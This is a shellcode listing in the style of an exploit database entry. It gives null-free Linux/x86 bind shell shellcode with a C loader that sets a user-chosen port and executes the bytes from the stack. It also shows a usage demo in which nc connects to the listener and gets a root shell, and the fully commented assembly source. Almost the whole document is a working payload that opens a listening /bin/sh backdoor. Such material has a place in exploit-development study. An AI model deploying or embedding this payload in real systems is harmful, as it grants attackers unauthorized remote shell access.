# Exploit Title: Linux/x86 - Bind (User Specified Port) Shell (/bin/sh) Shellcode (102 bytes)
# Date: 08/07/2021
# Exploit Author: d7x
# Tested on: Ubuntu x86

/***
	Linux/x86 Bind Shell (/bin/sh) with dynamic port binding Null-Free Shellcode (102 bytes)
	Usage: gcc -z execstack -o bindshell bindshell.c
	./bindshell 7000
	Binding to 7000 (0x1b58)

	netstat -antlp | grep 7000
	tcp        0      0 0.0.0.0:7000            0.0.0.0:*               LISTEN      26088/bindshell
	nc -nv 127.0.0.1 7000
	Connection to 127.0.0.1 7000 port [tcp/*] succeeded!
	id
	uid=0(root) gid=0(root) groups=0(root)

	*** Created by d7x
		https://d7x.promiselabs.net
		https://www.promiselabs.net ***
***/


#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x56\x89\xe1\xcd\x80\x89\xc6\x31\xc9\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf2\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";

main(int argc, char *argv[])
{

  /* Default port at 28th and 29th byte index: \x11\x5c */

  // in case no port is provided the default would be used
  if (argc < 2) {
    printf("No port provided, 4444 (0x115c will be used)\n");
  }
  else
  {

    int port = atoi(argv[1]);
    printf("Binding to %d (0x%x)\n", port, port);

    unsigned int p1 = (port >> 8) & 0xff;
    unsigned int p2 = port & 0xff;
    // printf("%x %x\n", p1, p2);

    shellcode[28] = (unsigned char){p1};
    shellcode[29] = (unsigned char){p2};

    // printf("%x %x", shellcode[28], shellcode[29]);
}

  int (*ret)() = (int(*)())shellcode;

  ret();

}

/***
; shellcode assembly


global _start:

section .text

_start:
; socketcall (0x66)
;   syscall SYS_SOCKET (0x01) - int socket(int domain, int type, int protocol);
xor eax, eax
xor ebx, ebx
mov al, 0x66
mov bl, 0x01

; pushing arguments to the stack backwards: int protocol (PF_INET, SOCK_STREAM, 0)
xor edx, edx
push edx ; int domain

push 0x01 ; SOCK_STREAM
push 0x02 ; PF_INET (AF_INET and PF_INET is the same)

mov ecx, esp

; syscall
int 0x80

; save returned file descriptor from eax into esi for later use
mov esi, eax

; socketcall (0x66)
;   syscall BIND (0x02) - int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
mov al, 0x66
mov bl, 0x02

; pushing arguments to the stack backwards:
; bind(sockid, (struct sockaddr *) &addrport, sizeof(addrport));

; xor edx, edx
push edx
push word 0x5c11 ; port 4444
push word 0x02  ; PF_INET

mov ecx, esp

push 0x10 	; sockaddr length
push ecx 	; sockaddr pointer
push esi 	; saved socket descriptor

mov ecx, esp

; syscall
int 0x80

; socketcall (0x66)
;   syscall  SYS_LISTEN (0x04) - int listen(int sockfd, int backlog);
mov al, 0x66
mov bl, 0x04

; pushing arguments to the stack backwards:
; listen(sockid, 0);
push edx 	; push 0

push esi 	; socket file descriptor saved earlier in esi

mov ecx, esp

; syscall
int 0x80

; socketcall (0x66)
;   syscall SYS_ACCEPT (0x05) - int sock_accept = accept(sockid, 0, 0);
mov al, 0x66
mov bl, 0x05

push edx
push esi ; socket file descriptor saved earlier in esi
mov ecx, esp

; syscall
int 0x80

; save returned file descriptor from eax into esi for later use
mov esi, eax

; dup2 (0x3f)
;   0 ; stdin

; dup2 (0x3f)
;   1 ; stdout

; dup2 (0x3f)
;   2 ; stderr
; let's put all this in a loop
xor ecx, ecx

DUPCOUNT:
; (0 - stdin, 1 - stdout, 2 - stderr) dup2 - __NR_dup2                63
; int dup2(int oldfd, int newfd);

; xor eax, eax
mov al, 0x3f

; ebx (socket descriptor, being copied over from esi saved earlier)
; ecx will be calculated automatically based on the loop value
mov ebx, esi  	; saved socket descriptor

; syscall
int 0x80

inc cl
cmp cx, 2
jle DUPCOUNT 	; count until 2 is reached


; execve (0x0b)
;   /bin//sh
xor eax, eax
; xor ebx, ebx
; sub esp, 8 	; reserve some bytes in the stack to work with
push eax 	; substituted sub esp, 8 to reduce opcode size

mov al, 0x0b
push 0x68732f2f ; //sh
push 0x6e69622f ; /bin
mov ebx, esp

xor ecx, ecx

; syscall
int 0x80

***/